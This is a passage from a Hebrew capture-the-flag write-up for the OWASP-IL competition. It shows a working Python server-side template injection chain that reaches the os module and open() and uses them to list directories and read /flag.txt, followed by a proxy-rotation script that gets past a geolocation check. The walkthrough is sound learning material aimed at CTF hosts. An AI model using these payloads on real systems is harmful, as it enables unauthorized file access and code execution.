  {{''.__class__.mro()[2].__subclasses__()[59]}}
  &lt;class
  'warnings.catch_warnings'&gt;
  {{''.__class__.mro()[2].__subclasses__()[59]
  .__init__.func_globals['linecache'].__dict__['os']}}
  &lt;module
  'os' from '/usr/local/lib/python2.7/os.pyc'&gt;
&nbsp;
מפה אפשר להריץ כבר
פקודות של OS, למשל:
```python
{{''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')}}
```
מציג:
```
['templates', 'app.py', 'requirements.txt']
```
באופן דומה (עם נתיב
קצת שונה), הרצת:
```python
{{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('app.py').read()}}
```
תפלוט את התוכן של app.py.
מפה צריך פשוט למצוא
את הקובץ המתאים:
```python
req = "{{"
req += "''"
req += ".__class__.mro()[2]"
req += ".__subclasses__()[59]"
req += ".__init__"
req += ".func_globals['linecache']"
req += ".__dict__['os']"
req += ".listdir('/')"
req += "}}"
r = requests.get("http://challenges.owaspil.ctf.today:8087/get_recommendation?name=a&recommender=" + req)
print (r.text)
#Output:
"""["srv", "tmp", "sbin", "bin", "var", "root", "run", "sys", "etc", "opt", "mnt", "boot", "lib", "dev", "media", "proc", "usr", "home", "lib64", ".dockerenv", "flag.txt", "app"]"""
req = "{{"
req += "''"
req += ".__class__.mro()[2]"
req += ".__subclasses__()[59]()"
req += "._module"
req += ".__builtins__['open']('/flag.txt')"
req += ".read()"
req += "}}"
r = requests.get("http://challenges.owaspil.ctf.today:8087/get_recommendation?name=a&recommender=" + req)
print (r.text)
```
&nbsp;
הדגל:
OWASP-IL{IAmL00kingF0rT3mpl4tes}
&nbsp;
אתגר 12 - Around the world – REAL (רמת
קושי בינונית, 500 נקודות)
&nbsp;
הוראות האתגר:
Hi you! Do you think that you traveled the world? Your
mission is to enter to our site with IP that belongs to country that we request
you
Can you do that ? use with REAL IP :)
URL: http://challenges.owaspil.ctf.today:8095/
&nbsp;
פתרון:
כמו קודם, כניסה
לאתר מציגה טקסט בתבנית הבאה:
In order to get the flag you must to serve
from Brazil (You served from Israel)| Counter: 0/16
המימוש מאוד דומה
לתרגיל המקורי:
```python
import requests, re
ip_table = {}
with open("proxy.txt") as f:
    for line in f:
        line = line.rstrip()
        ip, country = line.split("\t")
        if country.lower() not in ip_table:
            ip_table[country.lower()] = []
        ip_table[country.lower()].append(ip)
s = requests.Session()
country_regex = re.compile("In order to get the flag you must to serve from ([^(]+) \(")
proxies = None
text = ""
def get_page(proxies):
    r = s.get('http://challenges.owaspil.ctf.today:8095/', proxies=proxies)
    print (r.text)
    return r.text
text = get_page(None)
while "OWASP" not in text:
    match = country_regex.search(text)
    if match:
        country = match.group(1).lower()
        for ip in ip_table[country]:
            proxies = {'http': ip}
            print (proxies)
            try:
                text = get_page(proxies)
                if "you must to serve from {}".format(country) not in text.lower():
                    break
            except:
                pass
        else:
            print ("No IP was successful for {}".format(country))
            break
    else:
        print ("No match for '{}'".format(text))
        break
print (text)
```
&nbsp;
ההבדלים העיקריים
הם:
·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
במקום
להשתמש ב-XFF, אנחנו
משתמשים בפרמטר של ספריית <a